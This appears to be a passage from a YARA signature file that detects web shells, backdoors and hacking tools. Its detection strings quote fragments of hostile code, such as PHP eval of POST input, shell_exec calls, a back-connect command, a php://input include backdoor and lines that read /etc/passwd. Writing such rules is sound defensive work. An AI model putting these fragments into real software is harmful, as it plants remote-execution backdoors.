hash2 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
hash3 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
hash4 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
strings:
$s2 = "@eval(stripslashes($_POST['phpcode']));" fullword
$s5 = "echo shell_exec($com);" fullword
$s7 = "if($sertype == \"winda\"){" fullword
$s8 = "function execute($com)" fullword
$s12 = "echo decode(execute($cmd));" fullword
$s15 = "echo system($com);" fullword
condition:
4 of them
}
rule SSC_webshell_asp_404 {
meta:
description = "Web Shell - file 404.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d9fa1e8513dbf59fa5d130f389032a2d"
strings:
$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"
condition:
all of them
}
rule SSC_winshell {
meta:
description = "Webshells Auto-generated - file winshell.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "3144410a37dd4c29d004a814a294ea26"
strings:
$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
$s1 = "WinShell Service"
$s2 = "__GLOBAL_HEAP_SELECTED"
$s3 = "__MSVCRT_HEAP_SELECT"
$s4 = "Provide Windows CmdShell Service"
$s5 = "URLDownloadToFileA"
$s6 = "RegisterServiceProcess"
$s7 = "GetModuleBaseNameA"
$s8 = "WinShell v5.0 (C)2002 janker.org"
condition:
all of them
}
rule SSC_HYTop2006_rar_Folder_2006Z {
meta:
description = "Webshells Auto-generated - file 2006Z.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "fd1b6129abd4ab177fed135e3b665488"
strings:
$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"
condition:
all of them
}
rule SSC_webshell_php_ghost {
meta:
description = "Web Shell - file ghost.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "38dc8383da0859dca82cf0c943dbf16d"
strings:
$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
condition:
all of them
}
rule SSC_pwreveal {
meta:
description = "Webshells Auto-generated - file pwreveal.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b4e8447826a45b76ca45ba151a97ad50"
strings:
$s0 = "*<Blank - no es"
$s3 = "JDiamondCS "
$s8 = "sword set> [Leith=0 bytes]"
$s9 = "ION\\System\\Floating-"
condition:
all of them
}
rule SSC_WebShell_php_webshells_tryag {
meta:
description = "PHP Webshells Github Archive - file tryag.php"
author = "Florian Roth"
hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
strings:
$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"
condition:
3 of them
}
rule SSC_webshell_webshells_new_con2 {
meta:
description = "Web shells - generated from file con2.asp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "d3584159ab299d546bd77c9654932ae3"
strings:
$s7 = ",htaPrewoP(ecalper=htaPrewoP:fI dnE:0=KOtidE:1 - eulaVtni = eulaVtni:nehT 1 => e"
$s10 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input n"
condition:
1 of them
}
rule SSC_webshell_browser_201_3_ma_download {
meta:
description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "37603e44ee6dc1c359feb68a0d566f76"
hash1 = "a7e25b8ac605753ed0c438db93f6c498"
hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
hash4 = "fa87bbd7201021c1aefee6fcc5b8e25a"
strings:
$s2 = "<small>jsp File Browser version <%= VERSION_NR%> by <a"
$s3 = "else if (fName.endsWith(\".mpg\") || fName.endsWith(\".mpeg\") || fName.endsWith"
condition:
all of them
}
rule SSC_shelltools_g0t_root_uptime {
meta:
description = "Webshells Auto-generated - file uptime.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "d1f56102bc5d3e2e37ab3ffa392073b9"
strings:
$s0 = "JDiamondCSlC~"
$s1 = "CharactQA"
$s2 = "$Info: This file is packed with the UPX executable packer $"
$s5 = "HandlereateConso"
$s7 = "ION\\System\\FloatingPo"
condition:
all of them
}
rule SSC_WebShell_cgitelnet {
meta:
description = "PHP Webshells Github Archive - file cgitelnet.php"
author = "Florian Roth"
hash = "72e5f0e4cd438e47b6454de297267770a36cbeb3"
strings:
$s9 = "# Author Homepage: http://www.rohitab.com/" fullword
$s10 = "elsif($Action eq \"command\") # user wants to run a command" fullword
$s18 = "# in a command line on Windows NT." fullword
$s20 = "print \"Transfered $TargetFileSize Bytes.<br>\";" fullword
condition:
2 of them
}
rule SSC_backdoor1_php {
meta:
description = "Semi-Auto-generated  - file backdoor1.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "e1adda1f866367f52de001257b4d6c98"
strings:
$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
$s2 = "class backdoor {"
$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"
condition:
1 of them
}
rule SSC_webshell_webshells_new_xxxx {
meta:
description = "Web shells - generated from file xxxx.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "5bcba70b2137375225d8eedcde2c0ebb"
strings:
$s0 = "<?php eval($_POST[1]);?>  " fullword
condition:
all of them
}
rule SSC_WebShell_Generic_PHP_2 {
meta:
description = "PHP Webshells Github Archive - from files CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php"
author = "Florian Roth"
super_rule = 1
hash0 = "335a0851304acedc3f117782b61479bbc0fd655a"
hash1 = "ca9fcfb50645dc0712abdf18d613ed2196e66241"
hash2 = "36d8782d749638fdcaeed540d183dd3c8edc6791"
hash3 = "03f88f494654f2ad0361fb63e805b6bbfc0c86de"
strings:
$s3 = "if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))" fullword
$s4 = "\\$port = {$_POST['port']};" fullword
$s5 = "$_POST['installpath'] = \"temp.pl\";}" fullword
$s14 = "if(isset($_POST['post']) and $_POST['post'] == \"yes\" and @$HTTP_POST_FILES[\"u"
$s16 = "copy($HTTP_POST_FILES[\"userfile\"][\"tmp_name\"],$HTTP_POST_FILES[\"userfile\"]"
condition:
4 of them
}
rule SSC_JSP_jfigueiredo_APT_webshell_2 {
meta:
description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
author = "F.Roth"
date = "12.10.2014"
score = 60
reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
strings:
$a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
$a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
$s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
$s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
condition:
all of ($a*) or all of ($s*)
}
rule SSC_hkdoordll {
meta:
description = "Webshells Auto-generated - file hkdoordll.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b715c009d47686c0e62d0981efce2552"
strings:
$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"
condition:
all of them
}
rule SSC_webshell_phpkit_0_1a_odd {
meta:
description = "Web Shell - file odd.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "3c30399e7480c09276f412271f60ed01"
strings:
$s1 = "include('php://input');" fullword
$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
$s4 = "// uses include('php://input') to execute arbritary code" fullword
$s5 = "// php://input based backdoor" fullword
condition:
2 of them
}
rule SSC_wh_bindshell_py {
meta:
description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "fab20902862736e24aaae275af5e049c"
strings:
$s0 = "#Use: python wh_bindshell.py [port] [password]"
$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
$s3 = "#bugz: ctrl+c etc =script stoped=" fullword
condition:
1 of them
}
rule SSC_webshell_Shell_ci_Biz_was_here_c100_v_xxx {
meta:
description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "f2fa878de03732fbf5c86d656467ff50"
hash1 = "27786d1e0b1046a1a7f67ee41c64bf4c"
hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
strings:
$s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri"
$s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\""
$s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
$s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de"
$s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER"
condition:
2 of them
}
rule SSC_webshell_2_520_job_ma1_ma4_2 {
meta:
description = "Web Shell - from files 2.jsp, 520.jsp, job.jsp, ma1.jsp, ma4.jsp, 2.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "64a3bf9142b045b9062b204db39d4d57"
hash1 = "9abd397c6498c41967b4dd327cf8b55a"
hash2 = "56c005690da2558690c4aa305a31ad37"
hash3 = "532b93e02cddfbb548ce5938fe2f5559"
hash4 = "6e0fa491d620d4af4b67bae9162844ae"
hash5 = "7eabe0f60975c0c73d625b7ddf7b9cbd"
strings:
$s4 = "_url = \"jdbc:microsoft:sqlserver://\" + dbServer + \":\" + dbPort + \";User=\" "
$s9 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getR"
condition:
all of them
}
rule SSC_webshell_webshells_new_php6 {
meta:
description = "Web shells - generated from file php6.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "ea75280224a735f1e445d244acdfeb7b"
strings:
$s1 = "array_map(\"asx73ert\",(ar"
$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
$s4 = "shell.php?qid=zxexp  " fullword
condition:
1 of them
}
rule SSC_shelltools_g0t_root_resolve {
meta:
description = "Webshells Auto-generated - file resolve.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "69bf9aa296238610a0e05f99b5540297"
strings:
$s0 = "3^n6B(Ed3"
$s1 = "^uldn'Vt(x"
$s2 = "\\= uPKfp"
$s3 = "'r.axV<ad"
$s4 = "p,modoi$=sr("
$s5 = "DiamondC8S t"
$s6 = "`lQ9fX<ZvJW"
condition:
all of them
}
rule SSC_WebShell_php_webshells_kral {
meta:
description = "PHP Webshells Github Archive - file kral.php"
author = "Florian Roth"
hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
strings:
$s1 = "$adres=gethostbyname($ip);" fullword
$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
$s20 = "<p><strong>Server listeleyici</strong><br />" fullword
condition:
2 of them
}
rule SSC_by063cli {
meta:
description = "Webshells Auto-generated - file by063cli.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "49ce26eb97fd13b6d92a5e5d169db859"
strings:
$s2 = "#popmsghello,are you all right?"
$s4 = "connect failed,check your network and remote ip."
condition:
all of them
}
rule SSC_webshell_jsp_cmdjsp {
meta:
description = "Web Shell - file cmdjsp.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "b815611cc39f17f05a73444d699341d4"
strings:
$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
condition:
all of them
}
rule SSC_FSO_s_cmd {
meta:
description = "Webshells Auto-generated - file cmd.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "cbe8e365d41dd3cd8e462ca434cf385f"
strings:
$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>"
$s1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
condition:
all of them
}
rule SSC_webshell_asp_EFSO_2 {
meta:
description = "Web Shell - file EFSO_2.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "a341270f9ebd01320a7490c12cb2e64c"
strings:
$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"
condition:
all of them
}
rule SSC_webshell_Safe_mode_breaker {
meta:
description = "Web Shell - file Safe mode breaker.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "5bd07ccb1111950a5b47327946bfa194"
strings:
$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
condition:
1 of them
}
rule SSC_WebShell_ru24_post_sh {
meta:
description = "PHP Webshells Github Archive - file ru24_post_sh.php"
author = "Florian Roth"
hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"
strings:
$s1 = "http://www.ru24-team.net" fullword
$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
$s6 = "Ru24PostWebShell"
$s7 = "Writed by DreAmeRz" fullword
$s9 = "$function=passthru; // system, exec, cmd" fullword
condition:
1 of them
}
rule SSC_PasswordReminder {
meta:
description = "Webshells Auto-generated - file PasswordReminder.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "ea49d754dc609e8bfa4c0f95d14ef9bf"
strings:
$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."
condition:
all of them
}
rule SSC_BIN_Server {
meta:
description = "Webshells Auto-generated - file Server.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
strings:
$s0 = "configserver"
$s1 = "GetLogicalDrives"
$s2 = "WinExec"
$s4 = "fxftest"
$s5 = "upfileok"
$s7 = "upfileer"
condition:
all of them
}
rule SSC_Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57 {
meta:
description = "Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ..."
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
hash2 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
hash3 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
hash4 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
hash7 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
hash8 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
hash9 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
hash10 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
hash11 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
strings:
$s1 = "$_POST['cmd'] = which('" ascii
$s2 = "$blah = ex(" fullword ascii
condition:
filesize < 600KB and all of them
}
rule SSC_webshell_shell_2008_2009mssql_phpspy_2005_full_phpspy_2006_arabicspy_hkrkoz {
meta:
description = "Web Shell - from files shell.php, 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
author = "Florian Roth"
date = "2014/01/28"
score = 60
super_rule = 1
hash0 = "791708057d8b429d91357d38edf43cc0"
hash1 = "3e4ba470d4c38765e4b16ed930facf2c"
hash2 = "aa17b71bb93c6789911bd1c9df834ff9"
hash3 = "b68bfafc6059fd26732fa07fb6f7f640"
hash4 = "40a1f840111996ff7200d18968e42cfe"
hash5 = "e0202adff532b28ef1ba206cf95962f2"
hash6 = "802f5cae46d394b297482fd0c27cb2fc"
strings:
$s0 = "$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";" fullword
$s5 = "while(list($kname, $columns) = @each($index)) {" fullword
$s6 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";" fullword
$s9 = "$tabledump .= \"   PRIMARY KEY ($colnames)\";" fullword
$fn = "filename: backup"
condition:
2 of ($s*) and not $fn
}
rule SSC_mysql_shell_php {
meta:
description = "Semi-Auto-generated  - file mysql_shell.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "d42aec2891214cace99b3eb9f3e21a63"
strings:
$s0 = "SooMin Kim"
$s1 = "smkim@popeye.snu.ac.kr"
$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"
condition:
1 of them
}
rule SSC_webshell_cpg_143_incl_xpl {
meta:
description = "Web Shell - file cpg_143_incl_xpl.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "5937b131b67d8e0afdbd589251a5e176"
strings:
$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
condition:
1 of them
}
rule SSC_installer {
meta:
description = "Webshells Auto-generated - file installer.cmd"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a507919ae701cf7e42fa441d3ad95f8f"
strings:
$s0 = "Restore Old Vanquish"
$s4 = "ReInstall Vanquish"
condition:
all of them
}
rule SSC_WebShell_ftpsearch {
meta:
description = "PHP Webshells Github Archive - file ftpsearch.php"
author = "Florian Roth"
hash = "c945f597552ccb8c0309ad6d2831c8cabdf4e2d6"
strings:
$s0 = "echo \"[-] Error : coudn't read /etc/passwd\";" fullword
$s9 = "@$ftp=ftp_connect('127.0.0.1');" fullword
$s12 = "echo \"<title>Edited By KingDefacer</title><body>\";" fullword
$s19 = "echo \"[+] Founded \".sizeof($users).\" entrys in /etc/passwd\\n\";" fullword
condition:
2 of them
}
rule SSC_Pastebin_Webshell {
meta:
description = "Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs"
author = "Florian Roth"
score = 70
date = "13.01.2015"
reference = "http://goo.gl/7dbyZs"
strings:
$s0 = "file_get_contents(\"http://pastebin.com" ascii
$s1 = "xcurl('http://pastebin.com/download.php" ascii
$s2 = "xcurl('http://pastebin.com/raw.php" ascii
$x0 = "if($content){unlink('evex.php');" ascii
$x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii
$y0 = "file_put_contents($pth" ascii
$y1 = "echo \"<login_ok>" ascii
$y2 = "str_replace('* @package Wordpress',$temp" ascii
condition:
1 of ($s*) or all of ($x*) or all of ($y*)
}
rule SSC_HYTop_DevPack_fso {
meta:
description = "Webshells Auto-generated - file fso.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b37f3cde1a08890bd822a182c3a881f6"
strings:
$s0 = "<!-- PageFSO Below -->"
$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"
condition:
all of them
}
rule SSC_ASPXspy2 {
meta:
description = "Web shell - file ASPXspy2.aspx"
author = "Florian Roth"
reference = "not set"
date = "2015/01/24"
hash = "5642387d92139bfe9ae11bfef6bfe0081dcea197"
strings:
$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
$s3 = "Process[] p=Process.GetProcesses();" fullword ascii
$s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
$s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
$s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
$s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
$s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
$s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
$s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
$s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
$s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
$s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
$s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii
condition:
6 of them
}
rule SSC_xssshell_db {
meta:
description = "Webshells Auto-generated - file db.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "cb62e2ec40addd4b9930a9e270f5b318"
strings:
$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"
condition:
all of them
}
rule SSC_webshell_jsp_web {
meta:
description = "Web Shell - file web.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "4bc11e28f5dccd0c45a37f2b541b2e98"
strings:
$s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request."
condition:
all of them
}
rule SSC_csh_php_php {
meta:
description = "Semi-Auto-generated  - file csh.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "194a9d3f3eac8bc56d9a7c55c016af96"
strings:
$s0 = ".::[c0derz]::. web-shell"
$s1 = "http://c0derz.org.ua"
$s2 = "vint21h@c0derz.org.ua"
$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"
condition:
1 of them
}
rule SSC_Webshell_27_9_acid_c99_locus7s {
meta:
description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
hash6 = "5ae121f868555fba112ca2b1a9729d4414e795c39d14af9e599ce1f0e4e445d3"
hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
hash8 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
strings:
$s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
$s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii
condition:
filesize < 1711KB and 1 of them
}
rule SSC_DllInjection {
meta:
description = "Webshells Auto-generated - file DllInjection.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a7b92283a5102886ab8aee2bc5c8d718"
strings:
$s0 = "\\BDoor\\DllInjecti"
condition:
all of them
}
rule SSC_webshell_in_JFolder_jfolder01_jsp_leo_warn {
meta:
description = "Web Shell - from files in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "793b3d0a740dbf355df3e6f68b8217a4"
hash1 = "8979594423b68489024447474d113894"
hash2 = "ec482fc969d182e5440521c913bab9bd"
hash3 = "f98d2b33cd777e160d1489afed96de39"
hash4 = "4b4c12b3002fad88ca6346a873855209"
hash5 = "e9a5280f77537e23da2545306f6a19ad"
strings:
$s4 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strD"
$s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDi"
condition:
all of them
}
rule SSC_screencap {
meta:
description = "Webshells Auto-generated - file screencap.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "51139091dea7a9418a50f2712ea72aa6"
strings:
$s0 = "GetDIBColorTable"
$s1 = "Screen.bmp"
$s2 = "CreateDCA"
condition:
all of them
}
rule SSC_Simple_PHP_BackDooR {
meta:
description = "Webshells Auto-generated - file Simple_PHP_BackDooR.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "a401132363eecc3a1040774bec9cb24f"
strings:
$s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
$s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
$s9 = "// a simple php backdoor"
condition:
1 of them
}
rule SSC_webshell_c99_Shell_ci_Biz_was_here_c100_v_xxx {
meta:
description = "Web Shell - from files c99.php, Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c66.php, c99-shadows-mod.php, c99shell.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "61a92ce63369e2fa4919ef0ff7c51167"
hash1 = "f2fa878de03732fbf5c86d656467ff50"
hash2 = "27786d1e0b1046a1a7f67ee41c64bf4c"
hash3 = "0f5b9238d281bc6ac13406bb24ac2a5b"
hash4 = "68c0629d08b1664f5bcce7d7f5f71d22"
hash5 = "048ccc01b873b40d57ce25a4c56ea717"
strings:
$s8 = "else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\""
condition:
all of them
}
rule SSC_webshell_phpshell_2_1_config {
meta:
description = "Web Shell - file config.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "bd83144a649c5cc21ac41b505a36a8f3"
strings:
$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword
condition:
all of them
}
rule SSC_Reader_asp {
meta:
description = "Semi-Auto-generated  - file Reader.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "ad1a362e0a24c4475335e3e891a01731"
strings:
$s1 = "Mehdi & HolyDemon"
$s2 = "www.infilak."
$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"
condition:
2 of them
}
rule SSC_Mithril_v1_45_dllTest {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "1b9e518aaa62b15079ff6edb412b21e9"
strings:
$s3 = "syspath"
$s4 = "\\Mithril"
$s5 = "--list the services in the computer"
condition:
all of them
}
rule SSC_Mithril_Mithril {
meta:
description = "Webshells Auto-generated - file Mithril.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "017191562d72ab0ca551eb89256650bd"
strings:
$s0 = "OpenProcess error!"
$s1 = "WriteProcessMemory error!"
$s4 = "GetProcAddress error!"
$s5 = "HHt`HHt\\"
$s6 = "Cmaudi0"
$s7 = "CreateRemoteThread error!"
$s8 = "Kernel32"
$s9 = "VirtualAllocEx error!"
condition:
all of them
}
rule SSC_r57shell_php_php {
meta:
description = "Semi-Auto-generated  - file r57shell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "d28445de424594a5f14d0fe2a7c4e94f"
strings:
$s0 = "r57shell" fullword
$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
$s2 = "RusH security team"
$s3 = "'ru_text12' => 'back-connect"
condition:
1 of them
}
rule SSC_c99shell {
meta:
description = "Webshells Auto-generated - file c99shell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "90b86a9c63e2cd346fe07cea23fbfc56"
strings:
$s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"
condition:
all of them
}
rule SSC_xssshell_default {
meta:
description = "Webshells Auto-generated - file default.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "d156782ae5e0b3724de3227b42fcaf2f"
strings:
